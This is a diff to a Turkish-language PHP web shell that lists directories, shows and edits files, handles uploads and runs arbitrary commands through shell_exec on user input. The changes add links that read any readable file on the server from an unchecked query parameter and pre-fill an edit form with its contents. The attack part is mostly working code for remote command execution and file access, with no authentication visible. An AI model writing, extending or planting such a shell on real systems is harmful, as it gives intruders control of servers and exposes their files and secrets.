@@ -17,7 +17,11 @@ function listDir($dir) {
             if (is_dir($path)) {
                 $output .= "<li><a href='?dir=" . $path . "'>📁 " . $item . "</a></li>";
             } else {
-                $output .= "<li>📄 " . $item . "</li>";
+                if (is_readable($path)) {
+                    $output .= "<li>📄 <a href='?file=" . $path . "'>" . $item . "</a></li>";
+                } else {
+                    $output .= "<li>📄 " . $item . " (Okunamıyor)</li>";
+                }
             }
         }
     }
@@ -74,6 +78,7 @@ function editFile($filename, $content) {
 }
 
 function executeCommand($cmd) {
+    $current_dir = $_SESSION['current_dir'];
     return "<pre style='text-align: start;'>" . shell_exec($cmd) . "</pre>";
 }
 
@@ -140,6 +145,16 @@ function showHelp() {
     - [echo]:Ekrana çıktı almak için kullanılır.(örn:echo Merhaba Dünya!)
     - [uname]:Linux ve diğer Unix benzeri işletim sistemlerinde sistem hakkında bilgi almak için kullanılır.(örn:uname -a)
     </pre>";
+}
+
+$fileContent = "";
+$fileName = "";
+if (isset($_GET['file'])) {
+    $filePath = $_GET['file'];
+    if (is_readable($filePath)) {
+        $fileName = basename($filePath);
+        $fileContent = file_get_contents($filePath);
+    }
 }
 
 $message = '';
@@ -262,8 +277,8 @@ if (isset($_FILES['file'])) {
     </div>  
     <div class="container">
     <form method="POST">
-        <textarea style="background-color: black; border: 2px solid green;  resize: none; width: 70%; margin-bottom: 8px; text-align: center; color: white;" name="file_content" placeholder="Yeni içerik" required></textarea>
-        <br><input type="text" name="edit_file" placeholder="Düzenlenecek dosyanın ismi" required>
+        <textarea style="background-color: black; border: 2px solid green; resize: vertical; height: 100px; width: 70%; margin-bottom: 8px; color: white;" name="file_content" placeholder="Yeni içerik" required><?php echo $fileContent; ?></textarea>
+        <br><input type="text" name="edit_file" placeholder="Düzenlenecek dosyanın ismi" required value="<?php echo $fileName; ?>">
         <input class="hover" type="submit" value="Dosyayı Düzenle">
     </form>
 
